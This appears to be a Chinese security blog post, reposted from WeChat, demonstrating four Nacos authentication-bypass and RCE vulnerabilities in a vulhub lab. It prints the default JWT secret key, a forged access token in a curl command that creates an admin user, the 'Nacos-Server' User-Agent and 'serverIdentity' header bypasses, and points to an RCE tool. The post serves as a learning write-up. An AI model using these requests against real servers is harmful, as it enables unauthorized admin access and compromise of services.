<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/02vdOPPO4JialNjD8A4ihg)

扫码领资料

获网安教程

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

目录
==

JWT_Secret_Key 硬编码导致的认证绕过漏洞 (**QVD-2023-6271**)  
不当处理 User-Agent 导致的认证绕过漏洞 (**CVE-2021-29441**)  
identity key value 硬编码权限绕过  
Hessian 反序列化 RCE

环境搭建
----

为了方便直接用 vulhub  
版本：NACOS v1.4.0

```
cd vulhub-master\nacos\CVE-2021-29441 
docker compose up -d
docker compose restart nacos


```

某些情况下 nacos 服务会启动失败（无法连接数据库导致），可以重启 nacos 服务或者重启所有服务 访问 http://127.0.0.1:8848/nacos/#/login

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3IncZblRvZDnDQXx1iaSf4COx6OAIAtgOfX8YXcyFicq9rbBTmGRibmPYQ/640?wx_fmt=png&from=appmsg)

默认账号密码都是 nacos

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3ruEqPwrcRCtpYXcZYeb2so61lpxmHRyp9iaES6k61ctneA3CFmEOFBQ/640?wx_fmt=png&from=appmsg)

JWT_Secret_Key 硬编码身份验证绕过
------------------------

尽管设置了 `NACOS_AUTH_ENABLE=true` 和自定义的 `NACOS_AUTH_TOKEN`，自定义的 token 并未生效，用户仍需使用默认的 `secret.key` 来生成可访问 API 接口的 `access_token`。预期是使用自定义的 `NACOS_AUTH_TOKEN` 来生成并使用 `access_token`，但实际上仍需要依赖默认的 `secret.key`

在 application.properties 中可以看到  
secret.key 的值默认为 SecretKey012345678901234567890123456789012345678901234567890123456789  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3ej63NDQKCas31azm8LCDiaKh49vaoJ9pYgl1aT1qsndzypXkI6AOj5A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3SLwicpibuXZFOvRpOQQoicN1OjicPMfQmQUGnttC9DXAacdcn25jwCzphg/640?wx_fmt=png&from=appmsg)

在得到 key 的值后我们可以任意伪造 jwt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3KlnjhP0akLCRnjqVszHOVtichXpJ07EjjibU2ZnFMWTicWIKNSKKYDeyw/640?wx_fmt=png&from=appmsg)

`curl -XPOST 'http://ip:8848/nacos/v1/auth/users/?accessToken=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6IjI2MTYyMzkwMjIifQ.5aXePQdHbh9hKNoj_qqCC4x6PzbXmpy-vYQHhi0PdjVHyDJ40Ge6CVz6AWuV1UHa4H8-A-LXMOqQGSXjrsJ8HQ&username=admin&password=123456'`  
访问接口 创建一个 admin 用户 密码 123456

不当处理 User-Agent 导致的认证绕过漏洞 (CVE-2021-29441)
------------------------------------------

版本: <=Nacos 1.4.1 配置为使用身份验证（-Dnacos.core.auth.enabled=true）  
nacos 在进行认证授权操作时，会判断请求的 user-agent 是否为”Nacos-Server”，如果是的话则不进行任何认证 可调用敏感接口

list 用户接口  
http://ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=1  
获取当前用户列表以及密码  
直接访问会 403

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3gCOhs2u8QzSiaP8Kn0lnsNhCSGbWVJV9rSgHvOAAKictF0p3EQQxbF0Q/640?wx_fmt=png&from=appmsg)

将 user-agent 头修改为 Nacos-Server 即可绕过

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3A2TjyibLUL7icu826NSNjCGveEopTIVXOdJakgVkyypZ2FYbUjZK6c0A/640?wx_fmt=png&from=appmsg)

添加用户接口：  
POST  
/nacos/v1/auth/users?username=admin&password=123456  
User-Agent: Nacos-Server  
pageNo=1&pageSize=9

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3q1GDo46UQBZ45Mmqws5X3d1MhoToESVZibwVW4mu1CjwC0eGiambJibQg/640?wx_fmt=png&from=appmsg)

创建登录成功

identity key value 硬编码权限绕过
--------------------------

影响版本：Nacos <= 2.2.0 nacos.core.auth.enabled=true  
当请求头携带 "serverIdentity:security" 时 可绕过权限认证

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3sGY2GKRMKENwqcDYQEsBrOdHe88YUYbtuzmmMcX1h8ogMlV5biarnbg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3Xrgr73EXYkhQop3SHibZCGXcbicJnEVpRUSBPibE8RZ8I54HibQs2P2qOQ/640?wx_fmt=png&from=appmsg)

https://github.com/alibaba/nacos/blob/d40190ee24af94fa87414b88239c47693c524333/core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java#L65

检查`authConfigs`对象中是否设置了`serverIdentityKey`和`serverIdentityValue` 如果这两个配置项都非空，代码会从 HTTP 请求的头部获取服务器身份信息 再对比 header 中 value 的值和配置文件中 nacos.core.auth.server.identity.value 的值是否相同，如果相同则通过权限校验

利用：  
添加用户接口  
`curl -XPOST 'http://ip:8848/nacos/v1/auth/users?user`

Hessian 反序列化 RCE
----------------

1.4.0 <= Nacos < 1.4.6 2.0.0 <= Nacos < 2.2.3  
Nacos 默认的 7848 端口是用于 Nacos 集群间 Raft 协议的通信，该端口的服务在处理部分 Jraft 请求时会使用 Hessian 进行反序列化

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSEaULuS2b4AqNuEjqRfiabr3ibNlNruxaia2aBQXdttyZ1kMqHmFoDAZ1eGZKQPD5Ec8m9gHU4InOOFA/640?wx_fmt=png&from=appmsg)

https://github.com/c0olw/NacosRce  
直接用大佬的工具一把嗦

```
来源: https://xz.aliyun.com/t/13193

```

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！

@

**学习更多渗透技能！体验靶场实战练习**

```
（hack视频资料及工具）


（部分展示）

往期推荐

【精选】SRC快速入门+上分小秘籍+实战指南

爬取免费代理，拥有自己的代理池

漏洞挖掘｜密码找回中的套路

渗透测试岗位面试题(重点：渗透思路)

漏洞挖掘 | 通用型漏洞挖掘思路技巧

干货｜列了几种均能过安全狗的方法！

一名大学生的黑客成长史到入狱的自述

攻防演练｜红队手段之将蓝队逼到关站！

巧用FOFA挖到你的第一个漏洞




看到这里了，点个“赞”、“再看”吧

```